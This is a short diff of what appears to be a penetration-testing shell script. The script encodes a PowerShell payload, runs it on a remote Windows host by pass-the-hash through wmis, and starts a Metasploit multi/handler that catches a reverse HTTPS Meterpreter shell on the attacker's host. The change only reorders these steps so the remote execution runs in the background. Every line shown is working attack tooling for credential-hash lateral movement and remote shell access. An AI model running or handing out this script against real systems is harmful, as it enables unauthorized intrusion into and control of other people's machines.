@@ -69,10 +69,9 @@ echo "The encoded scriptblock is $encode"
 command="cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc $encode"
 echo "The commandline syntax is $command"
 
-echo "Starting the multi handler"
 sleep 3
-msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_https LHOST=$lhost LPORT=$lport E
+#execute wmis -U "$user"%"$hash" //"$rhost" "cmd.exe /c "$command"" in the background
+"wait 30; /pentest/passwords/pth/bin/wmis -U $user%$hash //$rhost "$command"" &
 
-sleep 10
-#execute wmis -U "$user"%"$hash" //"$rhost" "cmd.exe /c "$command""
-/pentest/passwords/pth/bin/wmis -U $user%$hash //$rhost "$command"
+echo "Starting the multi handler"
+msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_https LHOST=$lhost LPORT=$lport E
